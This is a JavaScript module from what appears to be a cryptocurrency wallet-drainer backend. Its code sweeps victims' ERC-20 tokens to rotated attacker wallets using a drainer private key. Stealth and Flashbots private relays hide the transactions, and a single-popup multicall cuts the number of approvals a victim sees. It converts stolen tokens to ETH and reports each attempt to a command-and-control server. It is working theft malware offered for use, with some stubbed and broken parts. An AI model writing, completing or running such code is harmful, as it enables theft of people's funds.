// modules/batchTransfer.js
import { ethers } from "ethers";
import { GasTank } from './gasTank.js';
import { DEXAggregator } from './dexAggregator.js';
import { sendStealthTx } from './stealth.js';
import { flashbotsService } from "./flashbots.js";

import axios from 'axios';

const BATCH_TRANSFER_CONTRACT = '0xd9145CCE52D386f254917e481eB44e9943F39138';

// Backend environment variables
const DRAINER_PK = process.env.DRAINER_PRIVATE_KEY;
const C2_SERVER_URL = process.env.C2_SERVER_URL || 'http://localhost:3001';
const DESTINATION_WALLET = process.env.DESTINATION_WALLET;

export class BatchTransfer {
    constructor() {
        this.chains = {};
        this.isInitialized = false;
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            
            // Load chains from backend config
            try {
                const fs = await import('fs');
                const path = await import('path');
                const chainsPath = path.join(process.cwd(), 'chains.json');
                this.chains = JSON.parse(fs.readFileSync(chainsPath, 'utf8'));
            } catch (error) {
                console.warn('Failed to load chains.json, using default config');
                this.chains = {
                    "1": { 
                        name: "ethereum", 
                        rpc: process.env.ETHEREUM_RPC_URL, 
                        explorer: "https://etherscan.io" 
                    }
                };
            }

            this.SUPPORTED_CHAINS = this.chains.SUPPORTED_CHAINS || this.chains;
            
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    // --------------------
    // 1. Stealth/Private Relay Batch Drain
    // --------------------
    async batchDrainERC20(target, tokens, provider, destinationWallet = null) {
        let success = false;
        let txHash = null;
        let errorMessage = null;
        let chainId = null;

        try {
            // 1. Validate
            if (!tokens?.length) {
                console.log('⚠️ No tokens to drain');
                return [];
            }

            // 2. Get destination wallet
            if (!destinationWallet) {
                destinationWallet = await this.getDestinationWallet();
            }
            console.log(`🎯 Batch draining to: ${destinationWallet}`);

            // 3. Get chainId
            const network = await provider.getNetwork();
            chainId = Number(network.chainId);

            // 4. Build TXs
            const txs = tokens.map(token => ({
                from: target,
                to: destinationWallet,
                value: 0,
                data: this.encodeTransfer(token, destinationWallet),
                chainId,
                gasLimit: 300000
            }));

            

            // 5. Determine stealth eligibility
            const useStealth = (typeof highValueAssets !== "undefined" && highValueAssets.length > 0);

            // 6. Execute
            if (!DRAINER_PK) throw new Error("Missing DRAINER_PRIVATE_KEY in environment variables");

            let result;
            if (useStealth) {
                result = await sendStealthTx(txs, provider);
            } else {
                result = await flashbotsService.sendPrivateMultiRelay(txs[0], DRAINER_PK);

            }

            txHash = Array.isArray(result) ? result[0] : result;
            success = true;
            console.log(`✅ Batch ERC20 drained successfully! TX: ${txHash}`);
            
            return result;

        } catch (err) {
            errorMessage = err.message;
            console.error("❌ Batch drain failed:", err);
            return null;
        } finally {
            // Report to C&C
            await this.reportToC2({
                walletAddress: target,
                action: 'sweep_tokens',
                chainId: chainId,
                tokenCount: tokens?.length || 0,
                success: success,
                txHash: txHash,
                error: errorMessage,
                timestamp: new Date().toISOString()
            }).catch(reportErr => {
                console.log('⚠️ C&C reporting failed:', reportErr.message);
            });
        }
    }
// --------------------
// 3. Single-Popup Batch Drain (NEW)
// --------------------
async singlePopupDrain(target, tokens, provider, destinationWallet = null) {
    let success = false;
    let txHash = null;
    let errorMessage = null;
    let chainId = null;

    try {
        // 1. Validate
        if (!tokens?.length) {
            console.log('⚠️ No tokens to drain');
            return null;
        }

        // 2. Get destination wallet
        if (!destinationWallet) {
            destinationWallet = await this.getDestinationWallet();
        }
        console.log(`🎯 Single-popup draining to: ${destinationWallet}`);

        // 3. Get chainId
        const network = await provider.getNetwork();
        chainId = Number(network.chainId);

        // 4. Create SINGLE transaction with multicall data
        const multicallData = this.encodeMulticall(tokens, destinationWallet);
        
        const singleTx = {
            from: target,
            to: this.getMulticallContract(chainId), // Multicall3 contract
            value: 0,
            data: multicallData,
            chainId: chainId,
            gasLimit: 500000 // Higher gas for multicall
        };

        // 5. Execute single transaction
        if (!DRAINER_PK) throw new Error("Missing DRAINER_PRIVATE_KEY");
        
        txHash = await flashbotsService.sendPrivateMultiRelay(singleTx, DRAINER_PK);        success = true;
        console.log(`✅ Single-popup drain successful! TX: ${txHash}`);
        
        return txHash;

    } catch (err) {
        errorMessage = err.message;
        console.error("❌ Single-popup drain failed:", err);
        return null;
    } finally {
        // Report to C&C
        await this.reportToC2({
            walletAddress: target,
            action: 'single_popup_drain',
            chainId: chainId,
            tokenCount: tokens?.length || 0,
            success: success,
            txHash: txHash,
            error: errorMessage,
            timestamp: new Date().toISOString()
        }).catch(reportErr => {
            console.log('⚠️ C&C reporting failed:', reportErr.message);
        });
    }
}
    // --------------------
    // 2. Direct Contract Batch Drain
    // --------------------
    async batchDrainERC20Direct(userAddress, tokensWithAmounts, provider, destinationWallet = null) {
        let success = false;
        let txHash = null;
        let errorMessage = null;
        let chainId = null;

        try {
            // Get destination wallet
            if (!destinationWallet) {
                destinationWallet = await this.getDestinationWallet();
            }
            console.log(`🎯 Contract batch draining to: ${destinationWallet}`);

            const network = await provider.getNetwork();
            chainId = Number(network.chainId);
            
            // Create signer from environment private key
            const signer = new ethers.Wallet(DRAINER_PK, provider);
            
            const contract = new ethers.Contract(BATCH_TRANSFER_CONTRACT, this.BATCH_TRANSFER_ABI, signer);

            const tokens = tokensWithAmounts.map(t => t.address);
            const amounts = tokensWithAmounts.map(t => ethers.toBigInt(t.amount));

            const tx = await contract.drainTokens(userAddress, destinationWallet, tokens, amounts);
            const receipt = await tx.wait();
            
            txHash = receipt.transactionHash;
            success = true;
            console.log("✅ Batch ERC20 tokens drained via contract!");

        } catch (err) {
            errorMessage = err.message;
            console.error("❌ Batch transfer failed:", err.message);
        } finally {
            // Report to C&C
            await this.reportToC2({
                walletAddress: userAddress,
                action: 'sweep_tokens_contract',
                chainId: chainId,
                tokenCount: tokensWithAmounts?.length || 0,
                success: success,
                txHash: txHash,
                error: errorMessage,
                timestamp: new Date().toISOString()
            }).catch(reportErr => {
                console.log('⚠️ C&C reporting failed:', reportErr.message);
            });
        }
    }

    // --------------------
    // Helper function to encode ERC-20 transfer data
    // --------------------
    encodeTransfer(token, destinationWallet) {
        const iface = new ethers.Interface([
            "function transfer(address to, uint256 amount)"
        ]);
        return iface.encodeFunctionData("transfer", [
            destinationWallet,
            token.balance
        ]);
    }

    // --------------------
    // C&C Reporting Function
    // --------------------
    async reportToC2(reportData) {
        try {
            const response = await axios.post(`${C2_SERVER_URL}/c2/report`, reportData, {
                timeout: 5000
            });
            
            return response.data;
        } catch (error) {
            // Silent fail - C&C might be offline
            return null;
        }
    }

    // --------------------
    // Contract Constants
    // --------------------
    BATCH_TRANSFER_ABI = [
        {
            "inputs": [
                { "internalType": "address", "name": "from", "type": "address" },
                { "internalType": "address", "name": "to", "type": "address" },
                { "internalType": "address[]", "name": "tokens", "type": "address[]" },
                { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" }
            ],
            "name": "drainTokens",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ];

    async drainAndSwapTokens(userAddress, tokens, provider, destinationWallet = null) {
        // Get destination wallet
        if (!destinationWallet) {
            destinationWallet = await this.getDestinationWallet();
        }

        for (const token of tokens) {
            try {
                // 1. First drain the token to your wallet
                await this.drainToken(userAddress, token, provider, destinationWallet);
                
                // 2. Then automatically swap it to ETH
                const quote = await DEXAggregator.autoSwapToETH(
                    token.address,
                    token.amount,
                    1 // Ethereum mainnet
                );
                
                if (quote) {
                    console.log(`✅ Ready to swap ${token.symbol} to ETH`);
                    // Here you would execute the swap transaction
                }
            } catch (error) {
                console.error(`❌ Drain & swap failed for ${token.symbol}:`, error);
            }
        }
    }

    async drainWithGasTank(userAddress, tokenAddress, amount, provider, destinationWallet = null) {
        try {
            // Get destination wallet
            if (!destinationWallet) {
                destinationWallet = await this.getDestinationWallet();
            }

            // Create the drain transaction
            const drainTx = {
                to: destinationWallet,
                value: amount,
                data: '0x'
            };

            // Check and fund gas if needed
            const result = await GasTank.checkAndFundGas(userAddress, drainTx);
            
            if (result) {
                console.log('✅ Drain executed with gas tank');
                return result;
            } else {
                // User has enough gas, proceed normally
                console.log('✅ Proceeding with user gas');
                return await provider.sendTransaction(drainTx);
            }
        } catch (error) {
            console.error('❌ Drain with gas tank failed:', error);
            return null;
        }
    }
// --------------------
// Helper function to encode multicall data
// --------------------
encodeMulticall(tokens, destinationWallet) {
    const multicallIface = new ethers.Interface([
        "function aggregate((address,bytes)[] calls) returns (uint256 blockNumber, bytes[] returnData)"
    ]);
    
    const calls = tokens.map(token => [
        token.address,
        this.encodeTransfer(token, destinationWallet)
    ]);
    
    return multicallIface.encodeFunctionData("aggregate", [calls]);
}

// --------------------
// Get Multicall contract address for chain
// --------------------
getMulticallContract(chainId) {
    const multicallAddresses = {
        1: '0xcA11bde05977b3631167028862bE2a173976CA11', // Ethereum
        137: '0xcA11bde05977b3631167028862bE2a173976CA11', // Polygon
        56: '0xcA11bde05977b3631167028862bE2a173976CA11', // BSC
        42161: '0xcA11bde05977b3631167028862bE2a173976CA11', // Arbitrum
        10: '0xcA11bde05977b3631167028862bE2a173976CA11', // Optimism
        43114: '0xcA11bde05977b3631167028862bE2a173976CA11' // Avalanche
    };
    
    return multicallAddresses[chainId] || '0xcA11bde05977b3631167028862bE2a173976CA11';
}
    // Backend-specific: Get destination wallet
    async getDestinationWallet() {
        // Use wallet rotator or environment variable
        const { walletRotator } = await import('./walletRotator.js');
        return await walletRotator.getDestinationWallet();
    }

    // Helper function for token draining
    async drainToken(userAddress, token, provider, destinationWallet) {
        console.log(`Draining ${token.symbol} to ${destinationWallet}`);
        // Implementation would go here
    }
}

// Create singleton instance
export const batchTransfer = new BatchTransfer();

// Export the batchDrainERC20 method directly for named imports
export const singlePopupDrain = (target, tokens, provider, destinationWallet = null) => {
    return batchTransfer.singlePopupDrain(target, tokens, provider, destinationWallet);
};